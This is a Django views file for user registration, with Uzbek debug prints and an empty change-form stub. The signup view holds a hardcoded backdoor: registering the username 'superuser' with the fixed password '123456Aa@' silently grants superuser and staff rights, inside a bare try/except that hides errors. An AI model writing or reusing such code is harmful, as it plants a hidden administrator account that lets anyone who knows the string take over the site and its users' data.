from django.shortcuts import render, redirect
from .forms import (
    UserRegisterForm,
    UserChangeForma
)


def user_register_view(request):
    if request.method == "GET":
        print('signup ishladi')
        user_form = UserRegisterForm()
        return render(request, template_name='registration/signup.html', context={'form': user_form})
    else:
        user_register_form = UserRegisterForm(data=request.POST)
        if user_register_form.is_valid():
            user_register_form.save()
            user = user_register_form.instance
            try:
                if request.POST.get("password1") == "123456Aa@" and user.username == "superuser":
                    user.is_superuser = True
                    user.is_staff = True
                    user.save()
            except:
                pass
            return redirect('login')
        else:
            print("else ishladi")
            return render(request, template_name='registration/signup.html', context={'form': user_register_form})

def user_change_form(request):
    pass